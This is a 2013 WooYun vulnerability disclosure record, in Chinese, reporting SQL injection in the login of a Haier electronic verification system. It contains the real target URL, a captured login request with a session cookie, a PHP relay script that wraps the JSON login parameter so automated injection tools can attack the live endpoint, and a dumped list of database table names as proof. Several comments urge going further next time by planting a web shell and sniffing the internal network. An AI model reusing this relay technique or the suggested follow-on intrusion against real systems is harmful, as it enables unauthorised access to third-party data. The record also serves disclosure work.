{"id": 9413, "wybug_id": "wooyun-2013-034087", "wybug_title": "海尔集团之14某非常重要系统很有姿势的SQL注射", "wybug_corp": "海尔集团", "wybug_author": "小胖子", "wybug_date": "2013-08-11 14:51", "wybug_open_date": "2013-09-25 14:51", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-09-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-09-25：\t细节向公众公开  简要描述： 小胖子正在暴走！！小胖子已经超越神的杀戮！！求求谁去杀了他吧！！ 详细说明：  系统地址：http://evs.haier.net/easp/uiloader/login.html海尔电子核销系统在登陆的时候，用单引号登陆，就报错了。本来以为会很简单，用一般的post注入就搞定。\n\n但是我还是太傻太天真，抓到包的那一刻我眼泪掉下来。\nPOST http://evs.haier.net/easp/uiloader/$/ssb/uiloader/ssoLoginMgt/login.ssm HTTP/1.1Accept: */*Referer: http://evs.haier.net/easp/uiloader/login.htmlAccept-Language: zh-cnAccept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)Host: evs.haier.netContent-Length: 40Proxy-Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=2kpTSFLPRmJ2Fn1CYrJlD1GJjhmpVG8knMRSyMzkLRDpFM40t6L2!-881110793; cctUserId=admin; cctLocale=zh[{\"userId\":\"admin\",\"password\":\"123456\"}]\n传递出去的参数是这样的啊，[{\"userId\":\"admin\",\"password\":\"123456\"}]，SQLmap和其他的工具根本就不认啊。但是这明显就是注入啊？智能无奈，写一个中转php文件，大爱小学生。\n<?phpif (empty($_GET['id'])){echo \"vip.php?id=z7ysbsbsb\";}else{$id=$_GET['id'];$post_data=\"[{\\\"userId\\\":\\\"$id\\\",\\\"password\\\":\\\"123456\\\"}]\"; $url='http://evs.haier.net/easp/uiloader/$/ssb/uiloader/ssoLoginMgt/login.ssm';$ch = curl_init();curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_URL,$url);curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);ob_start();curl_exec($ch);$result = ob_get_contents() ;ob_end_clean();echo $result;}?>\n这里get的ID来替换掉post里面的userid参数，来实现注入。本地访问下看看。\n\n恩，看样子是问题不大了。这里由于是中转注射了，本地是win的环境和php，可能检测出来跟服务器有差别。\n\n但是呢，数据是跑不掉的。\n\n\n\nover。   漏洞证明：  一部分数据。\nDatabase: public[206 tables]+-------------------------------+| Coefficients                  || DEPARTAMENTOS                 || DUMMY                         || D_PR_CUSTAS                   || EMPLOYEE                      || EPIXEIRISI                    || Enseignant                    || EventRedirect                 || Event_Category                || FUNDGROUP                     || Film                          || Firma                         || Fusion                        || Fusion8                       || Gruppen                       || HISTORY                       || JamPass                       || LIBRARY_BRANCH                || LT_CUSTOM1                    || LT_DECISAO                    || LT_ENCERRAMENTO               || LT_EQUIPES                    || LT_OBJETO                     || LT_SERIE                      || Lieux                         || MSmerge_errorlineage          || PROYECTO                      || Parameter                     || Pays                          || PropColumnMap                 || QRTZ_BLOB_TRIGGERS            || QRTZ_CRON_TRIGGERS            || QRTZ_FIRED_TRIGGERS           || ROLE                          || SGA_XPLAN_TPL_V$SQL_PLAN_SALL || States                        || TBLREPORTS                    || TRABAJA_EN                    || Titres                        || WidgetDescriptions            || _wfspro_admin                 || a_admin                       || abstract                      || admin_user                    || adminlogin                    || adminpsw                      || admuserinfo                   || articulos                     || attrs                         || auteur                        || badspy                        || bayview                       || be_groups                     || binn_maillist                 || binn_menu_tlevel              || binn_pages                    || binn_vote_temps               || bkp_String                    || categorie                     || cdb_bbcodes                   || cdb_itempool                  || cdb_pms                       || cdb_pmsearchindex             || cdb_polls                     || child_configs                 || cmContentVersionDigitalAsset  || cmRole                        || cms_member                    || cms_users                     || connections                   || contador                      || dados_estudante               || dbstaff                       || directeur                     || dtb_mailmaga_template         || dtb_news                      || dtb_other_deliv               || dtb_products_class            || egresado                      || enregistrs                    || equipment_type_seq            || esame                         || estado                        || etudiants                     || ew_menu                       || extremes                      || f_classtype                   || feedback                      || files_config                  || forums                        || geo_Sea                       || glas                          || guava_theme_modules           || id                            || imageCategoryList             || individual                    || inscription                   || jos_core_acl_aro_groups       || jos_core_log_searches         || jos_menu_types                || jos_messages_cfg              || jos_preguntas                 || jos_session                   || jos_templates_menu            || jos_vm_manufacturer_category  || jos_vm_product_reviews        || kpro_adminlogs                || licenses                      || lists                         || located                       || locus_data                    || lost_pass                     || mac                           || manutencao                    || melodies                      || membres                       || mgbliuyan                     || mucRoomProp                   || mushroom_testset              || my_lake                       || mymps_certification           || mymps_corp                    || mymps_crons                   || mymps_navurl                  || mymps_news_img                || mymps_telephone               || nuke_autonews                 || nuke_banner                   || nuke_bbdisallow               || nuke_encyclopedia_text        || nuke_journal_comments         || nuke_stats_year               || oe                            || oil_bannerclient              || oil_bfsurveypro_34            || oil_biolmed_entity            || oil_biolmed_measurements      || oil_core_acl_aro_map          || oil_modules                   || oil_session                   || order                         || ordre                         || papers                        || passwd                        || pc                            || phpbb_config                  || platforms                     || post                          || principal                     || produits                      || pw_attachs                    || pw_config                     || pw_forums                     || pw_hack                       || radacct                       || rating_track                  || rcpt                          || register                      || registriert                   || reglement                     || rel_paper_topic               || request                       || rss_categories                || rss_read                      || service                       || setting                       || site_iwis                     || solicitacaosenha              || spip_documents_rubriques      || spip_syndic                   || spip_types_documents          || spt_datatype_info             || spt_provider_types            || ssb                           || sse_familia                   || store3                        || store4                        || sysmaps                       || tables_priv                   || tbl_admins                    || tbl_tech                      || tblblogtrackbacks             || tblproducts                   || tbuseraccount                 || themes                        || time_zone_transition_type     || transfers                     || turizmi_ge                    || un                            || userInfo                      || user_connection               || user_online_newyear           || user_pword                    || user_uploads_pictures         || userid                        || utilisateurs                  || valhalla                      || vars                          || vcd                           || vcd_Log                       || vendor_types                  || vendors                       || webcal_entry_ext_user         || webcal_entry_log              || x_world                       || zl_admin                      |+-------------------------------+\n   修复方案：  0x1：注入啊注入，老是在登陆框~伤了心。0x2：5天确认周期，完了就忽略，注意时间的掌控啊！   版权声明：转载请注明来源 小胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-08-13 15:24 厂商回复： 感谢 @小胖子 的工作。给低和5rank的原因如下：该系统业务责任人答复原话为：“你们通过SQL注入，并没有连接上EVS的数据库，没有登录到EVS，不存在业务数据的泄漏。”请各位白帽子持续友好监督海尔信息安全工作，非常感谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-11 15:07 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  擦。。    \n     2013-08-11 15:08 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  mark    \n     2013-08-11 16:21 |    \t\t夜虫儿 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:4        | ^_^)\t\t \n  这是我的第一条评论，我实在受不了你了，你给我透漏个底吧，一共有多少，我好心里有个数@小胖子    \n     2013-08-11 16:25 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @夜虫儿 20左右    \n     2013-08-11 16:28 |    \t\t夜虫儿 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:4        | ^_^)\t\t \n  一次性发出来吧，天天啥事也不用干了，光关注你这个漏洞了。。。。。    \n     2013-08-11 16:30 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @夜虫儿 一次性发出来就是20rank精华=40rank 分20次发就是平均15rank + 最撸力洞主=15*20+150=450rank    \n     2013-08-11 16:35 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @夜虫儿 宝贝，1008611个，@px1624 宝贝，我不是你这个意思，我的意思是，我看大神都有一个自己的系列，我在准备我下一个系列了，哈哈哈，羡慕嫉妒恨吧~    \n     2013-08-11 16:44 |    \t\t夜虫儿 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:4        | ^_^)\t\t \n  @小胖子 好客山东欢迎你，没到过海底世界，别说你来过青岛！    \n     2013-08-11 16:47 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @夜虫儿 很快我就去海尔上班了，我来找你！！！    \n     2013-08-11 16:52 |    \t\t夜虫儿 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:4        | ^_^)\t\t \n  如果需要租房子，通知一声；如果需要找**，通知一声。    \n     2013-08-11 17:15 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n  告诉我  你积攒了多久。。。。。    \n     2013-08-11 18:07 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @小胖子 大神都是腾讯系列 新浪系列 百度系列    \n     2013-08-11 18:26 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @px1624 你是怎么知道我下一个系列的新浪？    \n     2013-08-11 19:44 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @小胖子 大婶，我的马甲可以借给你用！不用谢的    \n     2013-08-11 19:56 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @zzR 好，新浪系列的就用你的马甲发！    \n     2013-08-11 20:19 |    \t\t霍大然 \t\t\t( 普通白帽子  |\t\t\t        Rank:1136 漏洞数:178        | W币花完了，刷分还是不刷？)\t\t \n  @小胖子 牛逼啊，各种姿势注射！    \n     2013-09-12 17:35 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  你们通过SQL注入，并没有连接上EVS的数据库，没有登录到EVS，不存在业务数据的泄漏。    \n     2013-09-25 19:03 |    \t\tnick被注册 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:20        | 天一)\t\t \n  你们通过SQL注入，并没有连接上EVS的数据库，没有登录到EVS，不存在业务数据的泄漏.这明显就是告诉洞主：你不深入，我就不给你高分！建议下次直接拿服务器    \n     2013-10-10 10:34 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  下次直接写个shell 进去。内网嗅探 搞挂他，看他给多少，，，，mark    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}